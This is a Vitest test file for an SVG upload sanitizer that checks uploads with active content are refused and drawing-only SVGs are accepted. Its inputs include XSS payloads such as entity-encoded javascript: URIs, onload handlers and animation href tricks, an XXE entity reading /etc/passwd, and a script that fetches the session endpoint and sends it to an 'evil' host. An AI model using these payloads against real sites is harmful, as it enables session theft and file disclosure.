import { describe, it, expect } from "vitest"
import {
  containsActiveContent,
  inspectSvgForActiveContent,
} from "../sanitize/svgActiveContent"

describe("containsActiveContent", () => {
  describe("refuses what the string-matching sanitizer let through", () => {
    it.each([
      [
        "a handler with no whitespace before it",
        `<svg xmlns="http://www.w3.org/2000/svg"/onload="alert(1)"></svg>`,
      ],
      [
        "a javascript: URI spelled with a decimal entity",
        `<svg><a href="&#106;avascript:alert(1)"><text>x</text></a></svg>`,
      ],
      [
        "a javascript: URI spelled with a hex entity",
        `<svg><a href="&#x6A;avascript:alert(1)"><text>x</text></a></svg>`,
      ],
      [
        "<set> assigning href at animation time",
        `<svg><a><set attributeName="href" to="javascript:alert(1)"/></a></svg>`,
      ],
      [
        "<animate> doing the same",
        `<svg><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg>`,
      ],
      [
        "an external entity declaration",
        `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>`,
      ],
    ])("refuses %s", (_label, svg) => {
      expect(containsActiveContent(svg)).toBe(true)
    })
  })

  describe("refuses the obvious cases too", () => {
    it.each([
      ["a <script> element", `<svg><script>alert(1)</script></svg>`],
      ["a closing script tag alone", `<svg></script></svg>`],
      ["an onclick attribute", `<svg><circle onclick="x()" r="5"/></svg>`],
      ["an onload with odd spacing", `<svg><circle\n  onload = "x()" r="5"/></svg>`],
      ["a <foreignObject>", `<svg><foreignObject><b>hi</b></foreignObject></svg>`],
      ["an <iframe>", `<svg><iframe src="//evil"></iframe></svg>`],
      ["a data:text/html URI", `<svg><a href="data:text/html,<script>alert(1)</script>">x</a></svg>`],
      ["a vbscript: URI", `<svg><a href="vbscript:msgbox(1)">x</a></svg>`],
      [
        "the payload from the report verbatim",
        `<svg><script>fetch('/api/auth/get-session').then(r=>r.text()).then(t=>fetch('https://evil/?d='+t))</script></svg>`,
      ],
    ])("refuses %s", (_label, svg) => {
      expect(containsActiveContent(svg)).toBe(true)
    })
  })

  describe("accepts SVG that only draws", () => {
    it.each([
      [
        "a plain logo",
        `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60" viewBox="0 0 200 60"><title>Logo</title><g fill="none"><path d="M0 0h200v60H0z" fill="#111"/><text x="12" y="38" font-size="24" fill="#fff">BeYours</text></g></svg>`,
      ],
      [
        "gradients and transforms",
        `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><defs><linearGradient id="g"><stop offset="0%" style="stop-color:rgb(255,255,0)"/></linearGradient></defs><g transform="translate(50,50)"><path d="M10 80 Q 95 10 180 80" stroke="black" fill="none"/></g></svg>`,
      ],
      [
        "an exporter DOCTYPE with no internal subset",
        `<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>`,
      ],
      [
        "a filter, which the drawing profile allows",
        `<svg xmlns="http://www.w3.org/2000/svg"><filter id="b"><feGaussianBlur stdDeviation="2"/></filter><rect width="10" height="10" filter="url(#b)"/></svg>`,
      ],
      [
        "an internal fragment link",
        `<svg xmlns="http://www.w3.org/2000/svg"><use href="#shape"/><g id="shape"><circle r="5"/></g></svg>`,
      ],
      [
        "a word merely containing 'on'",
        `<svg xmlns="http://www.w3.org/2000/svg"><text font-family="Montserrat">London</text></svg>`,
      ],
    ])("accepts %s", (_label, svg) => {
      expect(containsActiveContent(svg)).toBe(false)
    })
  })

  it("names why it refused, for the message the uploader sees", () => {
    const report = inspectSvgForActiveContent(
      `<svg onload="x()"><script>y()</script></svg>`,
    )
    expect(report.active).toBe(true)
    expect(report.reasons.length).toBeGreaterThanOrEqual(2)
    expect(report.reasons.join(" ")).toContain("script")
  })

  it("reports nothing for a clean file", () => {
    expect(
      inspectSvgForActiveContent(`<svg><circle r="5"/></svg>`),
    ).toEqual({ active: false, reasons: [] })
  })
})
